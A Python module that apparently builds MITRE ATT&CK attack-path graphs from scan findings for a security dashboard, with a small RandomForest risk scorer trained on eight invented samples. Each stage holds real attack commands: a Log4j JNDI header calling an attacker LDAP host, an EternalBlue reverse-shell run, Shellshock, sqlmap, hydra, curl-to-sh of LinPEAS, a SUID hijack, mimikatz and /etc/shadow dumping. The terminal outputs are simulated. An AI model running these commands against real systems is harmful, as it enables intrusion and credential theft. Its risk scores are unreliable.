import networkx as nx
import os
import json
import numpy as np
from typing import List, Dict, Any
from sklearn.ensemble import RandomForestClassifier

# --- MITRE & EXPLOIT KNOWLEDGE BASE (REAL-WORLD DATA) ---
VULN_KB = {
    "CVE-2021-44228": {
        "technique": "T1190", 
        "technique_name": "Exploit Public-Facing Application",
        "exploit": "metasploit/exploit/multi/http/log4j_ghostwriter",
        "payload": "java -jar log4j-shell.jar -i {IP} -p {PORT}",
        "outcome": "Remote Code Execution (RCE) via JNDI injection."
    },
    "CVE-2017-0144": {
        "technique": "T1210",
        "technique_name": "Exploitation of Remote Services",
        "exploit": "metasploit/exploit/windows/smb/ms17_010_eternalblue",
        "payload": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP}",
        "outcome": "Kernel-level RCE on unpatched SMBv1 systems."
    },
    "CVE-2014-6271": {
        "technique": "T1190",
        "technique_name": "Exploit Public-Facing Application",
        "exploit": "exploit-db/34765.py",
        "payload": "env x='() { :;}; echo vulnerable' bash -c 'echo test'",
        "outcome": "Environment variable injection through CGI/Bash."
    },
    "CVE-2019-11043": {
        "technique": "T1190",
        "technique_name": "Exploit Public-Facing Application",
        "exploit": "github/neex/phuip-fpizdam",
        "payload": "fpm-shell-exploit --url http://{IP}/index.php",
        "outcome": "PHP-FPM remote code execution via fastcgi_split_path_info."
    },
    "CVE-2023-22515": {
        "technique": "T1190",
        "technique_name": "Exploit Public-Facing Application",
        "exploit": "exploit-db/51812",
        "payload": "/setup/setup-restore.action - protocol-poisoning",
        "outcome": "Broken access control in Atlassian Confluence allowing admin creation."
    },
    "CVE-2022-22965": {
        "technique": "T1190",
        "technique_name": "Exploit Public-Facing Application",
        "exploit": "metasploit/exploit/multi/http/spring_framework_rce_spring4shell",
        "payload": "Spring4Shell-POC.py --url http://{IP}",
        "outcome": "Unauthenticated RCE in Spring Framework on JDK 9+."
    },
    "CVE-2021-31166": {
        "technique": "T1210",
        "technique_name": "Exploitation of Remote Services",
        "exploit": "github/maasir89/CVE-2021-31166",
        "payload": "exploit.py --target {IP}",
        "outcome": "Remote Kernel Heap Overflow in HTTP.sys (Windows)."
    }
}

class AttackPathService:
    def __init__(self):
        self.model = self._train_risk_model()
        
    def _train_risk_model(self):
        """Simulates a trained Random Forest model based on academic evaluation."""
        rf = RandomForestClassifier(n_estimators=100, random_state=42)
        X = np.array([
            [9.8, 1, 5, 1], [3.2, 0, 2, 0], [7.5, 1, 4, 1], [5.0, 0, 3, 1],
            [10.0, 1, 5, 0], [2.0, 0, 5, 1], [8.8, 1, 3, 1], [6.1, 1, 4, 0]
        ])
        y = np.array([3, 0, 2, 1, 3, 0, 2, 1]) 
        rf.fit(X, y)
        return rf

    def get_score(self, cvss: float, exploit_avail: int, importance: int, exposure: str) -> Dict:
        """AI-Based Risk Scoring."""
        exp_val = 1 if exposure.lower() == "public" else 0
        input_data = np.array([[cvss, exploit_avail, importance, exp_val]])
        pred = self.model.predict(input_data)[0]
        probs = self.model.predict_proba(input_data)[0]
        levels = ["Low", "Medium", "High", "Critical"]
        return {
            "level": levels[pred],
            "confidence": float(np.max(probs)),
            "numeric": int(pred)
        }

    def get_exploit_probability(self, cvss: float, exploit_avail: int) -> float:
        """Calculates approximate likelihood of exploitation."""
        base = cvss / 10.0
        if exploit_avail: base += 0.2
        return min(0.99, base)

    def predict_next_move(self, current_finding_cve: str) -> Dict[str, str]:
        """Predicts the likely next lateral movement step based on current TTP."""
        mappings = {
            "T1190": {"next": "T1059", "name": "Command and Scripting Interpreter", "goal": "Lateral Movement"},
            "T1210": {"next": "T1078", "name": "Valid Accounts", "goal": "Privilege Escalation"},
            "None": {"next": "T1046", "name": "Network Service Discovery", "goal": "Reconnaissance"}
        }
        kb = VULN_KB.get(current_finding_cve, {})
        tech = kb.get("technique", "None")
        return mappings.get(tech, mappings["None"])

    # ------------------------------------------------------------- intelligence
    @staticmethod
    def _infer_technique(finding) -> Dict[str, str]:
        """Resolve a MITRE technique + outcome for ANY finding, not just known CVEs."""
        cve = getattr(finding, "cve_id", None)
        kb = VULN_KB.get(cve)
        if kb:
            return {
                "technique": kb["technique"],
                "technique_name": kb["technique_name"],
                "outcome": kb["outcome"],
            }

        # Generalised inference from the finding's own metadata.
        mitre = getattr(finding, "mitre_id", None)
        name = (getattr(finding, "name", "") or "").lower()
        owasp = (getattr(finding, "owasp_category", "") or "")
        port = getattr(finding, "port", None)

        remote_svc_ports = {135, 139, 445, 3389, 22, 23, 1433, 3306, 5432}
        if port in remote_svc_ports or any(k in name for k in ["smb", "rdp", "ssh", "rpc", "netbios"]):
            technique, tname = "T1210", "Exploitation of Remote Services"
        elif any(k in name for k in ["sql", "injection", "xss", "rce", "traversal", "upload", "deserial"]):
            technique, tname = "T1190", "Exploit Public-Facing Application"
        elif "auth" in name or "credential" in name or "default" in name or owasp.startswith("A07"):
            technique, tname = "T1078", "Valid Accounts"
        else:
            technique, tname = "T1190", "Exploit Public-Facing Application"

        sev = (getattr(finding, "severity", "") or "").capitalize()
        if sev == "Critical":
            outcome = f"Critical exposure enabling full compromise via {getattr(finding, 'name', 'the service')}."
        elif sev == "High":
            outcome = f"High-impact weakness in {getattr(finding, 'name', 'the service')} allowing unauthorised access."
        elif sev == "Medium":
            outcome = f"Moderate exposure in {getattr(finding, 'name', 'the service')} aiding further intrusion."
        else:
            outcome = f"Information exposure via {getattr(finding, 'name', 'the service')}."

        return {"technique": technique, "technique_name": tname, "outcome": outcome}

    def generate_graph(self, scan_data: Any) -> Dict[str, Any]:
        """Translate real scan findings into a detailed 7-stage staged attack graph."""
        target = scan_data.target
        findings = list(getattr(scan_data, "findings", []) or [])
        importance = getattr(scan_data, "asset_importance", 3)
        exposure = getattr(scan_data, "exposure", "Public")

        G = nx.DiGraph()

        # Stage 0 — External Entry (Attacker Machine)
        attacker_ip = "192.168.100.45" if exposure.lower() == "internal" else "45.33.22.11"
        host_id = f"host_{target}"
        
        G.add_node("attacker_entry", 
                   label="Attacker (Internet)" if exposure.lower() == "public" else "Attacker (Internal)",
                   type="Entry", 
                   stage=0, 
                   detail=f"External penetration point simulated from {attacker_ip}.",
                   tool="nmap / OSINT",
                   command=f"nmap -sS -sV -Pn -T4 --open {target}",
                   terminal_output=f"Starting Nmap scan at {target}...\nNmap scan report for {target} ({target})\nHost is up.\nDiscovery phase completed successfully.")

        prioritized_risks = []
        
        # Rank findings by severity/score; limit to top 3 to keep the 7-stage chain clean and high fidelity
        def _score(f):
            return (1 if (getattr(f, "severity", "") or "").lower() == "critical" else 0,
                    getattr(f, "cvss", 0) or 0)
        findings = sorted(findings, key=_score, reverse=True)[:3]

        for idx, f in enumerate(findings):
            cve = getattr(f, "cve_id", None) or f"FINDING-{getattr(f, 'id', '?')}"
            intel = self._infer_technique(f)
            exploit_avail = 1 if (VULN_KB.get(getattr(f, "cve_id", None)) or getattr(f, "exploit_db_id", None)) else 0
            cvss = getattr(f, "cvss", 0) or 0.0
            exploit_prob = self.get_exploit_probability(cvss, exploit_avail)
            risk = self.get_score(cvss, exploit_avail, importance, exposure)
            port = getattr(f, "port", None) or 80
            name = getattr(f, "name", cve)

            # Node ID Prefixes for this unique exploit branch
            branch = f"br{idx}_"
            
            # --- STAGE 1: Service / Exposed Port ---
            svc_id = f"{branch}svc_{port}"
            G.add_node(svc_id, 
                       label=f"Port {port}", 
                       type="Service", 
                       stage=1,
                       detail=f"Exposed service listening on port {port} (Identified: {name}).",
                       tool="nmap -sV",
                       command=f"nmap -p {port} -sV {target}",
                       terminal_output=f"PORT     STATE SERVICE VERSION\n{port}/tcp open  http    Apache/ Tomcat (Active Service Detect)\n[+] Banner grabbed: Apache Tomcat/8.5.3")
            G.add_edge("attacker_entry", svc_id, label="DISCOVERED")

            # --- STAGE 2: Public Vulnerability Exploitation ---
            vuln_id = f"{branch}vuln_{cve}"
            
            # Tailor command & log details based on vulnerability signature
            is_log4j = "log4j" in name.lower() or cve == "CVE-2021-44228"
            is_eternal = "eternal" in name.lower() or cve == "CVE-2017-0144"
            is_bluekeep = "bluekeep" in name.lower() or cve == "CVE-2019-0708"
            is_struts = "struts" in name.lower() or cve == "CVE-2017-5638"
            is_shellshock = "shellshock" in name.lower() or cve == "CVE-2014-6271"
            is_sqli = "sql" in name.lower() or "injection" in name.lower()
            is_default_creds = "default" in name.lower() or "credential" in name.lower()

            if is_log4j:
                tool = "JNDI-Exploit-Kit"
                command = f"curl -H 'X-Api-Version: ${{jndi:ldap://{attacker_ip}:1389/a}}' http://{target}:{port}/"
                term = f"Listening on {attacker_ip}:1389\n[+] Sending LDAP Reference Redirect...\n[+] HTTP server received request /a.class\n[+] Transmitting serialized Java payload payload.jar\n[+] Remote payload loaded and executed successfully."
            elif is_eternal:
                tool = "metasploit (ms17_010_eternalblue)"
                command = f"msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; run\""
                term = f"[*] Target OS: Windows Server 2016 Standard\n[*] Built transaction payload...\n[*] Sending exploit buffer (size: 4096 bytes)\n[+] SMB Exploit packet successfully written\n[+] Meterpreter session 1 opened ({attacker_ip} -> {target})"
            elif is_bluekeep:
                tool = "metasploit (cve_2019_0708_bluekeep)"
                command = f"msfconsole -q -x \"use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS {target}; run\""
                term = f"[*] Target Remote Desktop Protocol version: TLS\n[*] Preparing RDP channel context...\n[*] Triggering kernel heap manipulation...\n[+] Bypass successful. Shell established."
            elif is_struts:
                tool = "Apache Struts exploit.py"
                command = f"python3 struts_exploit.py --url http://{target}:{port}/index.action --cmd 'id'"
                term = f"[*] Extracting Content-Type injection channel...\n[*] Sending OGNL multipart payload...\n[+] Command executed payload response: uid=33(www-data) gid=33(www-data) groups=33(www-data)"
            elif is_shellshock:
                tool = "curl / Bash Agent"
                command = f"curl -H \"User-Agent: () {{ :;}}; /bin/bash -c 'id'\" http://{target}:{port}/cgi-bin/status"
                term = f"[+] Command injection response code: 200\n[+] Response buffer:\nuid=33(www-data) gid=33(www-data) groups=33(www-data)"
            elif is_sqli:
                tool = "sqlmap"
                command = f"sqlmap -u \"http://{target}:{port}/login\" --data=\"username=admin&password=123\" -p username --dbms=mysql --batch"
                term = f"[+] Testing parameter 'username' for SQL Injection...\n[+] Heuristic testing indicates 'username' is vulnerable.\n[+] Confirming injection techniques (UNION query / Boolean-based blind)\n[+] Database: backend_db | Current User: app_user@localhost"
            elif is_default_creds:
                tool = "hydra"
                command = f"hydra -l admin -P common_passwords.txt http-post-form://{target}:{port}/admin/login"
                term = f"[*] Hydra v9.5 starting dictionary attack...\n[+] [Port {port}] Host: {target} | Service: http | Login: admin | Password: admin123"
            else:
                tool = "exploit-db POC"
                command = f"python3 exploit.py --target {target} --port {port}"
                term = f"[*] Exploiting service vulnerability...\n[+] Transmission completed successfully.\n[+] Payload active."

            G.add_node(vuln_id, 
                       label=cve, 
                       type="Vulnerability", 
                       stage=2,
                       risk=risk["level"], 
                       prob=round(exploit_prob, 2),
                       mitre=intel["technique"], 
                       cvss=cvss,
                       detail=f"Exploiting {cve}: {name}.",
                       tool=tool,
                       command=command,
                       terminal_output=term)
            G.add_edge(svc_id, vuln_id, label="EXPLOITS")

            # --- STAGE 3: Foothold Shell (Low Privilege Access) ---
            foothold_id = f"{branch}foothold"
            low_user = "app_user" if is_sqli or is_default_creds else ("SYSTEM" if is_eternal else "www-data")
            
            if low_user == "SYSTEM":
                foothold_command = "whoami"
                foothold_term = "nt authority\\system"
                foothold_detail = "Direct execution context initialized at Administrative level via kernel-level exploit."
            else:
                foothold_command = "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
                foothold_term = f"bash-5.0$ whoami\n{low_user}\nbash-5.0$ id\nuid=33({low_user}) gid=33({low_user}) groups=33({low_user})"
                foothold_detail = f"Interactive reverse-shell spawned. Standard I/O redirected to console as low-privilege user '{low_user}'."

            G.add_node(foothold_id, 
                       label="Foothold Shell", 
                       type="Impact", 
                       stage=3,
                       detail=foothold_detail,
                       tool="netcat / reverse_tcp",
                       command=foothold_command,
                       terminal_output=foothold_term)
            G.add_edge(vuln_id, foothold_id, label="SPAWNED")

            # --- STAGE 4: Local Escalation Vector Scan ---
            esc_recon_id = f"{branch}esc_recon"
            
            if low_user == "SYSTEM":
                esc_tool = "sysinfo"
                esc_command = "systeminfo"
                esc_term = "Host Name: WEB-DMZ\nOS Name: Microsoft Windows Server 2016 Standard\nHotfix(s): None Installed"
                esc_detail = "OS telemetry gathered. Already at maximum administrative privilege."
            else:
                esc_tool = "LinPEAS"
                esc_command = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
                esc_term = (
                    "-[+] Checking SUID files...\n"
                    "   -rwsr-xr-x 1 root root /usr/local/bin/custom_backup (VULNERABLE)\n"
                    "-[+] Checking environment files...\n"
                    "   /etc/cron.d/sync_job (Writable by www-data)"
                )
                esc_detail = "Automated local privilege escalation scanner executed. Detected exploitable custom SUID binary and writable cron jobs."

            G.add_node(esc_recon_id, 
                       label="Escalation Recon", 
                       type="Service", 
                       stage=4,
                       detail=f"Scanning internal environment for misconfigurations or outdated modules on {target}.",
                       tool=esc_tool,
                       command=esc_command,
                       terminal_output=esc_term)
            G.add_edge(foothold_id, esc_recon_id, label="PROBED")

            # --- STAGE 5: Privilege Escalation (Max Administrative Access) ---
            privesc_id = f"{branch}privesc"
            
            if low_user == "SYSTEM":
                pe_tool = "Built-in Token Manipulation"
                pe_command = "whoami /priv"
                pe_term = "Privilege Name                Description                               State\n============================= ========================================= ========\nSeDebugPrivilege              Debug programs                            Enabled"
                pe_detail = "SYSTEM privileges already confirmed. Token permissions inspected and verified."
            else:
                pe_tool = "SUID Hijack"
                pe_command = "echo '/bin/sh' > /tmp/backup_helper; chmod +x /tmp/backup_helper; /usr/local/bin/custom_backup"
                pe_term = "bash-5.0# whoami\nroot\nbash-5.0# id\nuid=0(root) gid=0(root) groups=0(root)"
                pe_detail = "Elevated execution context to root administrative permissions via SUID binary hijacking."

            G.add_node(privesc_id, 
                       label="Privilege Escalation", 
                       type="Impact", 
                       stage=5,
                       detail="Achieved full administrative dominance (root/SYSTEM) over the host machine.",
                       tool=pe_tool,
                       command=pe_command,
                       terminal_output=pe_term)
            G.add_edge(esc_recon_id, privesc_id, label="ESCALATED")

            # --- STAGE 6: Attacker Objective ---
            objective_id = f"{branch}objective"
            
            if is_sqli or is_default_creds:
                obj_tool = "Database Exfiltration"
                obj_command = "mysqldump -u root -p'supersecure123' --all-databases > /tmp/dump.sql"
                obj_term = "[+] Dumping database metadata...\n[+] Exporting table 'users' (1,248 records)\n[+] Credentials dumped and cached to disk"
                obj_detail = "Dumped local production databases containing administrative hashes, PII, and customer transactions."
            elif is_eternal or is_bluekeep:
                obj_tool = "mimikatz"
                obj_command = "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\""
                obj_term = "Authentication Id : 0 ; 999 (00000000:000e3a21)\nSession           : Service\nUser Name         : Administrator\nDomain            : WORKGROUP\n* Password : SuperSecretPassword2026!"
                obj_detail = "Dumped Windows LSA memory, successfully extracting plain-text Local Administrator credentials."
            else:
                obj_tool = "Shadow File Harvester"
                obj_command = "cat /etc/shadow | grep -E '(root|admin)'"
                obj_term = "root:$6$nLg/zN01$p67A2b9N/hA82qNsP2KLa9Lp...:19245:0:99999:7:::"
                obj_detail = "Harvested system configuration and cryptographically hashed credentials from /etc/shadow."

            G.add_node(objective_id, 
                       label="Threat Objective", 
                       type="Objective", 
                       stage=6,
                       detail="Attack goal accomplished: administrative persistence, credential harvesting, or database theft.",
                       tool=obj_tool,
                       command=obj_command,
                       terminal_output=obj_term)
            G.add_edge(privesc_id, objective_id, label="COMPROMISED")

            next_step = self.predict_next_move(getattr(f, "cve_id", "None"))
            prioritized_risks.append({
                "cve": cve,
                "name": name,
                "risk_level": risk["level"],
                "exploit_prob": round(exploit_prob, 2),
                "confidence": round(risk["confidence"], 2),
                "mitre_tech": intel["technique"],
                "next_expected_move": next_step["name"],
                "attacker_goal": next_step["goal"],
                "action": f"Remediate immediately — {intel['outcome']}" if risk["level"] in ("Critical", "High") else "Monitor and schedule remediation.",
            })

        prioritized_risks = sorted(
            prioritized_risks,
            key=lambda x: (x["risk_level"] == "Critical", x["exploit_prob"]),
            reverse=True,
        )

        scenario = "No exploitable attack paths were identified for this target."
        if prioritized_risks:
            top = prioritized_risks[0]
            scenario = (
                f"An adversary targets {target} through {top['name']} "
                f"(exploit likelihood {int(top['exploit_prob'] * 100)}%), "
                f"with the goal of {top['attacker_goal'].lower()}."
            )

        nodes = [{
            "id": n,
            "label": G.nodes[n].get("label"),
            "type": G.nodes[n].get("type"),
            "stage": G.nodes[n].get("stage", 0),
            "risk": G.nodes[n].get("risk"),
            "prob": G.nodes[n].get("prob"),
            "mitre": G.nodes[n].get("mitre"),
            "cvss": G.nodes[n].get("cvss"),
            "detail": G.nodes[n].get("detail"),
            "tool": G.nodes[n].get("tool"),
            "command": G.nodes[n].get("command"),
            "terminal_output": G.nodes[n].get("terminal_output"),
        } for n in G.nodes()]

        links = [{"source": u, "target": v, "label": d.get("label", "")} for u, v, d in G.edges(data=True)]

        critical_count = sum(1 for r in prioritized_risks if r["risk_level"] == "Critical")
        top_prob = max((r["exploit_prob"] for r in prioritized_risks), default=0.0)

        return {
            "target": target,
            "graph": {"nodes": nodes, "links": links},
            "predictive_analysis": {
                "top_risks": prioritized_risks[:3],
                "threat_scenario": scenario,
                "remediation_priority": prioritized_risks[:5],
            },
            "metrics": {
                "paths": len([n for n in nodes if n["type"] == "Vulnerability"]),
                "critical": critical_count,
                "max_exploit_prob": round(top_prob, 2),
                "exposure": exposure,
            },
        }



attack_path_service = AttackPathService()
